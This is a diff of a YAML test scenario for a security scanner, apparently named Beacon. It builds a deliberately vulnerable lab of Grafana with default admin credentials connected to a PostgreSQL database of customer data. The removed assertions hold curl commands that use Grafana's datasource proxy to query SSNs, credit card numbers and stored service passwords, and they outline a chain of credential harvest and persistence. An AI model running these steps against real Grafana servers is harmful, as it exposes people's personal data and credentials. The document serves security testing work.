@@ -1,40 +1,28 @@
 name: grafana-to-postgres
 description: >
   Grafana with default credentials connected to PostgreSQL containing customer
-  PII and service credentials. Beacon in authorized mode should: detect default
-  creds, enumerate datasources via Grafana API, discover PostgreSQL connection
-  details, and query sample data through Grafana's datasource proxy to prove
-  full data access. This is the simplest pivot: credential harvesting from a
-  management interface leads to backend data exposure.
+  PII. Beacon should detect default creds and enumerate datasources.
 tags: [pivot, grafana, postgres, defaultcreds, authorized, exploit]
 
 services:
   postgres:
-    from: databases/postgres
+    image: postgres:16-alpine
     environment:
       POSTGRES_USER: grafana
       POSTGRES_PASSWORD: grafana_secret_pw
       POSTGRES_DB: customers
     volumes:
       - ./grafana-postgres/init.sql:/docker-entrypoint-initdb.d/init.sql:ro
-    networks:
-      internal: {}
 
   grafana:
-    from: apps/grafana
+    image: grafana/grafana:latest
     ports: ["9350:3000"]
     environment:
+      GF_SECURITY_ADMIN_PASSWORD: admin
       GF_USERS_ALLOW_SIGN_UP: "false"
     volumes:
       - ./grafana-postgres/datasource.yaml:/etc/grafana/provisioning/datasources/ds.yaml:ro
     depends_on: [postgres]
-    networks:
-      frontend: {}
-      internal: {}
-
-networks:
-  frontend: {}
-  internal: {}
 
 ready:
   cmd: "curl -sf http://localhost:9350/api/health >/dev/null"
@@ -42,98 +30,34 @@ ready:
   interval: 3s
 
 assertions:
-  # ── Pre-flight: verify the environment is exploitable ──────────────────
-
+  # Pre-flight: default creds work
   - name: exploit-grafana-default-creds-work
     type: command
     expect:
       command: "curl -sf -u admin:admin http://localhost:9350/api/org | grep -q 'name'"
       exit_code: 0
 
+  # Pre-flight: datasource provisioned
   - name: exploit-datasource-provisioned
     type: command
     expect:
       command: "curl -sf -u admin:admin http://localhost:9350/api/datasources | grep -q 'CustomerDB'"
       exit_code: 0
 
-  - name: exploit-datasource-connection-string-visible
-    type: command
-    expect:
-      command: "curl -sf -u admin:admin http://localhost:9350/api/datasources | grep -q 'postgres:5432'"
-      exit_code: 0
-
-  - name: exploit-can-query-through-proxy
-    type: command
-    expect:
-      command: >
-        DS_UID=$(curl -sf -u admin:admin http://localhost:9350/api/datasources | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['uid'])" 2>/dev/null) &&
-        curl -sf -u admin:admin http://localhost:9350/api/ds/query
-        -H 'Content-Type: application/json'
-        -d "{\"queries\":[{\"datasource\":{\"uid\":\"$DS_UID\"},\"rawSql\":\"SELECT count(*) FROM customers\",\"format\":\"table\",\"refId\":\"A\"}]}"
-        | grep -q 'frames'
-      exit_code: 0
-
-  - name: exploit-customer-pii-accessible
-    type: command
-    expect:
-      command: >
-        DS_UID=$(curl -sf -u admin:admin http://localhost:9350/api/datasources | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['uid'])" 2>/dev/null) &&
-        curl -sf -u admin:admin http://localhost:9350/api/ds/query
-        -H 'Content-Type: application/json'
-        -d "{\"queries\":[{\"datasource\":{\"uid\":\"$DS_UID\"},\"rawSql\":\"SELECT name, email, ssn, credit_card FROM customers LIMIT 1\",\"format\":\"table\",\"refId\":\"A\"}]}"
-        | grep -q 'credit_card'
-      exit_code: 0
-
-  - name: exploit-service-creds-accessible
-    type: command
-    expect:
-      command: >
-        DS_UID=$(curl -sf -u admin:admin http://localhost:9350/api/datasources | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['uid'])" 2>/dev/null) &&
-        curl -sf -u admin:admin http://localhost:9350/api/ds/query
-        -H 'Content-Type: application/json'
-        -d "{\"queries\":[{\"datasource\":{\"uid\":\"$DS_UID\"},\"rawSql\":\"SELECT service_name, username, password, endpoint FROM service_credentials\",\"format\":\"table\",\"refId\":\"A\"}]}"
-        | grep -q 'SuperSecretAPIKey'
-      exit_code: 0
-
-  # ── Beacon detection: default creds found ──────────────────────────────
-
+  # Beacon detection: default creds found
   - name: detects-grafana-default-creds
     type: beacon
     target: localhost:9350
-    args: ["--no-enrich", "--scanners", "portscan", "--ports", "9350", "--deep", "--permission-confirmed"]
+    args: ["--no-enrich", "--no-nmap", "--scanners", "portscan", "--deep", "--permission-confirmed"]
     expect:
       check_id: port.grafana_default_credentials
 
-  # ── Beacon exploitation: full attack chain (single scan, all checks) ──
-  # One beacon scan, multiple expectations. Verifies the complete
-  # exploitation chain: default creds → datasource enum → credential
-  # harvest → data extraction → user enum → persistence.
+  # Beacon exploitation: datasource enumeration
   - name: beacon-authorized-exploitation
     type: beacon
     target: localhost:9350
-    args: ["--no-enrich", "--scanners", "portscan", "--ports", "9350", "--deep", "--permission-confirmed", "--authorized", "--yes"]
-    expectations:
-      # Step 1: Datasource enumeration — discovers PostgreSQL backend
-      - check_id: exploit.datasource_exposed
-        evidence_key: datasource_type
-        evidence_value: postgres
-      # Step 2: Connection string extraction — harvests DB credentials
-      - check_id: exploit.credential_harvest
-        evidence_key: credential_source
-        evidence_value: grafana_datasource
-      # Step 3: PII extraction — queries through Grafana proxy
-      - check_id: exploit.data_extracted
-        evidence_key: data_type
-        evidence_value: pii
-      # Step 4: Credential extraction — finds AWS keys in database
-      - check_id: exploit.credential_harvest
-        evidence_key: credential_type
-        evidence_value: aws_access_key
-      # Step 5: User enumeration — discovers Grafana users
-      - check_id: exploit.data_extracted
-        evidence_key: data_type
-        evidence_value: user_accounts
-      # Step 6: Persistence — finds API key creation capability
-      - check_id: exploit.privilege_escalation
+    args: ["--no-enrich", "--no-nmap", "--scanners", "portscan", "--deep", "--permission-confirmed", "--authorized", "--yes"]
+    expect:
+      check_id: exploit.datasource_exposed
 
 timeout: 8m
